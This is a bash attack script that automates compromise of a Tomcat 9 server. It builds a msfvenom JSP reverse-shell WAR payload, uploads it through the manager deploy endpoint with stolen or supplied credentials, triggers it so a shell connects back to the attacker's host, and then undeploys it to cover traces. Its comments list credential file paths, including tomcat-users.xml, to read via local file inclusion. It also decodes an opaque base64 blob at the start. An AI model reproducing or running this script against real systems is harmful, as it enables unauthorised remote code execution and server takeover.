#!/bin/bash
 

#Date:01-Jun-2022
#Author: Squzu
#This is a automated bashscript to upload a payload to tomcat 9 server using auth and get a reverse shell back!


# user name and password creds can be found in these paths via lfi
# /usr/share/tomcat9 and /var/lib/tomcat9
# /usr/share/doc.tomcat9-common/
# /etc/tomcat9/tomcat-users.xml


base64 -d <<<"H4sIAAAAAAAAA5VQQQ7DMAi78wo/YBsfisS+ME29TH38AJMwrd1hbhuDAScpYIkkALEwQmYrPOC0YibQtFCNjgEFdv+U9RI/LHpr9cl5iFCTXJQscfHH392qN+uddEtt3ZHTnZknsgyNhhnTRIfZZSXdUnQQLMclGBgciphC3pnnLIR9+N5mJ2dKn+SOv/77OXq7xp8W37g+H9trkzda4sS0IgIAAA=="|gunzip


#Gathering INFO#
echo "--------------------------------------------"
read -p "LHOST:" LHOST
read -p "LPORT: " LPORT
echo "  "
read -p "RHOST: " RHOST
read -p "RPORT: " RPORT
echo "  "
read -p "Tomcat username: " Username
read -p "Tomcat Password: " Password
echo "Prepare a netcat listner on port $LPORT -- nc -nvlp $LPORT"
echo "--------------------------------------------"

shellname=squzu_rev_shell

#GENERATING PAYLOAD#
echo "Generating Payload"
echo "--------------------------------------------"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war > /dev/shm/$shellname.war 

echo "Payload Generated"
sleep 2
echo "--------------------------------------------"
#UPLOADING PAYLOAD#
echo "Uploading shell to $URL"
echo "using Cred $Username:$Password"

function ProgressBar {
    let _progress=(${1}*100/${2}*100)/100
    let _done=(${_progress}*4)/10
    let _left=40-$_done
    _fill=$(printf "%${_done}s")
    _empty=$(printf "%${_left}s")
printf "\rProgress : [${_fill// /#}${_empty// /-}] ${_progress}%%"
}
_start=1
_end=100
for number in $(seq ${_start} ${_end})
do
    sleep 0.1
    ProgressBar ${number} ${_end}
done
printf '\n Uploaded!\n'



curl -u  "$Username:$Password" http://$RHOST:$RPORT/manager/text/deploy?path=/squzu --upload-file /dev/shm/$shellname.war

echo "--------------------------------------------"

#TRIGGERING PAYLOAD#
echo "sending Reverse Shell to $LHOST:$LPORT"
sleep 2 && curl http://$RHOST:$RPORT/squzu/ &> /dev/null 

#CLEANING THE SERVER#
echo "--------------------------------------------"
echo "cleaning "
echo "--------------------------------------------"
curl -u  "$Username:$Password" http://$RHOST:$RPORT/manager/text/undeploy?path=/squzu

echo "DONE!"
echo "--------------------------------------------"
 
